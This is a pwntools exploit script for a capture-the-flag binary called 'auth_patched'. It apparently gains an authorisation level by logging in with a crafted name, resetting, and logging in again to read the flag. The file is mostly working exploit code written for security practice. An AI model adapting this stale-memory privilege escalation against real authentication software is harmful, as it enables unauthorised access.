#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./auth_patched
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './auth_patched')
libc = ELF('./libc-2.23.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

def show():
    io.sendlineafter(b"> ", b"show")
    
def login(name: bytes):
    io.sendlineafter(b"> ", b"login " + name)

def set_auth(level: bytes):
    io.sendlineafter(b"> ", b"set-auth ", level)
    
def get_flag():
    io.sendlineafter(b"> ", b"get-flag")
    
def reset():
    io.sendlineafter(b"> ", b"reset")


io = start()

login(b"a"*0x8 + p64(5))
reset()
login(b"a"*0x8)
get_flag()

io.interactive()

